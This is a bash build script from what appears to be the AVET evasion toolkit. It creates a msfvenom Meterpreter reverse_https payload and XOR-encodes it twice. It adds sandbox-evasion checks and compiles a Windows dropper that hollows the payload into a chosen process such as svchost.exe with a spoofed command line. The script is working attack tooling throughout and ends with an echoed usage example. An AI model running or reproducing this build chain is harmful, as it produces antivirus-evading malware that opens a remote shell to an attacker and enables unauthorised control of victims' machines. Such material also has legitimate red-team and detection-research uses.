#!/bin/bash


#DESCRIPTION_START
# Hollowing 64-bit example build script
# First creates an AVET payload
# Secondly creates the executable that delivers the payload via hollowing
# The reverse_tcp meterpreter payload is hollowed into a target process by the generated dropper executable output.exe
# The target process to hollow into must be specified via the third(!) command line argument on dropper execution
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec for payload
set_command_source no_data
set_command_exec no_command
# generate key file for payload
generate_key preset aabbcc12de input/key_raw.txt
# enable debug print into file because we probably can not easily reach stdout of the hollowed process
enable_debug_print to_file C:/users/public/payload_log.txt
#CONFIGURATION_END



# --- ---
# GENERATE HOLLOWING PAYLOAD input/hollowing_payload.exe
# --- ---

printf "\n+++ Generating hollowing payload +++\n"

# generate metasploit payload that will later be hollowed into the target process
msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f raw --platform Windows > input/sc_raw.txt
# unstaged variant for testing purposes
#msfvenom -p windows/x64/meterpreter_reverse_https lhost=$LHOST lport=$LPORT extensions=stdapi,priv -e x64/xor -f raw -a x64 --platform Windows > input/sc_raw.txt

# add evasion techniques
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
add_evasion gethostbyname_sandbox_evasion 'this.that'
reset_evasion_technique_counter

# encode msfvenom shellcode
encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt

# array name buf is expected by static_from_file retrieval method
./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf

# set shellcode source
set_payload_source static_from_file input/scenc_c.txt

# convert generated key from raw to C into array "key"
./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key

# set key source
set_key_source static_from_file input/key_c.txt

# set payload info source
set_payload_info_source no_data

# set decoder
set_decoder xor

# set shellcode binding technique
set_payload_execution_method exec_shellcode64

# compile hollowing payload
$win64_compiler -o input/hollowing_payload64.exe source/avet.c -lws2_32
strip input/hollowing_payload64.exe
printf "\n Generated hollowing payload input/hollowing_payload64.exe\n"

# cleanup
cleanup_techniques


# --- ---
# GENERATE DROPPER EXECUTABLE THAT PERFORMS HOLLOWING output/output.exe
# --- ---

printf "\n+++ Generating dropper executable that performs hollowing +++\n"

# add evasion techniques
add_evasion fopen_sandbox_evasion 'c:\\windows\\system.ini'
add_evasion gethostbyname_sandbox_evasion 'this.that'

#CONFIGURATION_START
# generate key file for dropper executable
generate_key preset bbccdd34ef input/key_raw.txt
# no command preexec for dropper executable
set_command_source no_data
set_command_exec no_command
#CONFIGURATION_END

# encode hollowing payload
encode_payload xor input/hollowing_payload64.exe input/hollowing_payload_enc.txt input/key_raw.txt

# array name buf is expected by static_from_file retrieval method
./tools/data_raw_to_c/data_raw_to_c input/hollowing_payload_enc.txt input/hollowing_payload_enc_c.txt buf

# set payload source
set_payload_source static_from_file input/hollowing_payload_enc_c.txt

# convert generated key from raw to C into array "key"
./tools/data_raw_to_c/data_raw_to_c input/key_raw.txt input/key_c.txt key

# set key source
set_key_source static_from_file input/key_c.txt

# set payload info source
# this enables us to provide the path of the executable (and optionally the desired command line value) to hollow into at execution time via the third(!) command line argument
set_payload_info_source from_command_line_raw

# set decoder
set_decoder xor

# set payload execution technique
set_payload_execution_method hollowing64

# enable debug print to file
enable_debug_print to_file C:/users/public/dropper_log.txt

# compile hollowing payload
$win64_compiler -o output/hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe source/avet.c -lws2_32
strip output/hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe
printf "\n Generated dropper executable output/hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe\n"

# cleanup
cleanup_techniques

echo "
# Usage example of generated hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe:
#
# hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe first second C:\windows\system32\svchost.exe,C:\i\spoofed\this.exe
#
# The first and second command line parameters can be arbitrary strings, as they are not used. We just need the third command line parameter.
# The format of the third parameter is expected to be as follows:	<process to hollow into>,<desired command line of new process>
# So you need to specify two values, separated by a comma delimiter.
#
# <process to hollow into>:
# Path to the executable image of your hollowing target. Based on this image, A NEW PROCESS WILL BE CREATED and your actual payload hollowed into it.
#
# <parent command line of new process>:
# Specifies the command line of the newly created process. This will be passed internally as an argument for CreateProcess.
# So you can basically spoof the command line of your hollowing target here.
#
# !!!
# You are expected to keep the required format and specify all above mentioned parameters. Otherwise the program will probably crash (Who properly validates input anyway? The user always knows best ;)).
"
